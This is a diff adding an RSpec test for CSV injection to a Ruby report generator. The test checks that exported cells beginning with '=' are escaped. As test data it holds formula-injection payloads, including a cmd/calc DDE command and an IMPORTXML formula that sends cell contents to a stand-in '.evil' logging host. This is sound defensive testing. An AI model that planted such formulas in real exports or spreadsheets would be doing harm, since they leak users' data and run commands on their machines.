@@ -112,6 +112,62 @@ RSpec.describe ReportGenerator::Base do
 
         expect(subject.headers).to eq ['First Header', 'Include Header']
       end
+
+      context 'CSV injection' do
+        let(:payloads) do
+          # http://georgemauer.net/2017/10/07/csv-injection.html
+          # https://owasp.org/www-community/attacks/CSV_Injection
+          [
+            {
+              input: "=2+5+cmd|' /C calc'!A0",
+              output: "'=2+5+cmd|' /C calc'!A0"
+            },
+            {
+              input: %[=IMPORTXML(CONCAT("http://some-server-with-log.evil?v=", CONCATENATE(A2:E2)), "//a")],
+              output: %["'=IMPORTXML(CONCAT(""http://some-server-with-log.evil?v="", CONCATENATE(A2:E2)), ""//a"")"]
+            },
+            {
+              input: %[=1+2";=1+2],
+              output: %["'=1+2"";=1+2"]
+            },
+            {
+              input: %[=1+2'" ;,=1+2],
+              output: %["'=1+2'"" ;,=1+2"]
+            }
+          ]
+        end
+
+        let(:report_download) do
+          ReportGenerator::Download.new(report_data: { payloads: payloads })
+        end
+
+        subject { test_class.new(report_download).csv_string }
+
+        it 'escapes special characters' do
+          define_test_class do
+            private
+
+            def collection
+              Array.new(1)
+            end
+
+            def headers
+              data[:payloads].map { |payload| payload[:input] }
+            end
+
+            def generate_row(_)
+              data[:payloads].map { |payload| payload[:input] }
+            end
+          end
+
+          outputs = payloads.map { |payload| payload[:output] }
+
+          expect(subject).to eq <<~CSV
+            #{outputs.join(',')}
+            #{outputs.join(',')}
+          CSV
+        end
+      end
     end
 
     describe '#generate_row' do
